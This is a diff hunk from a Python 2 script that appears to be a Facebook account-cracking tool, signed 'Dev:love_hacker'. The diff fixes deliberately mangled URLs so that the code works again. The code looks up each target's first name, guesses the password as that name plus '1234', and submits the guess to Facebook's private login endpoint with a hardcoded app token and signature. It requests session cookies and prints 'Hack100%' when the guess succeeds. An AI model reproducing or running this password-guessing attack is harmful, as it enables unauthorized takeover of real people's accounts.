@@ -286,12 +286,12 @@ def pilih_super():
 		except OSError:
 			pass #Dev:love_hacker
 		try:													
-			a = requests.get('https☜☆☞//graph.facebook.com/'+user+'/?access_token='+toket)												
+			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
 			b = json.loads(a.text)												
 			pass1 = b['first_name'] + '1234'												
-			data = urllib.urlopen("https☜☆☞//b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
+			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			q = json.load(data)												
-			if 'access_token' in q☜☆☞
+			if 'access_token' in q:
 				x = requests.get("https☜☆☞//graph.facebook.com/"+user+"?access_token="+q['access_token'])
 				z = json.loads(x.text)
 				print '\x1b[1;91m[  ✓  ] \x1b[1;98mHack100%💉'											
